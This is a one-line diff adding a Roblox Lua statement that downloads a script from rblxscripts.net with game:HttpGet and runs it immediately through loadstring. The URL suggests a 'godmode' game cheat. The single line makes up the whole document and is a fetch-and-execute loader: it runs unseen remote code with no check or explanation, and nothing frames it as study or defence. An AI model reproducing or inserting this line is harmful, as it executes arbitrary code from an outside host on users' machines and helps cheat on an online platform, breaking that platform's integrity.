@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rblxscripts.net/raw/cheesy-free-and-keyless-op-godmode-auto-05bff0ff"))()
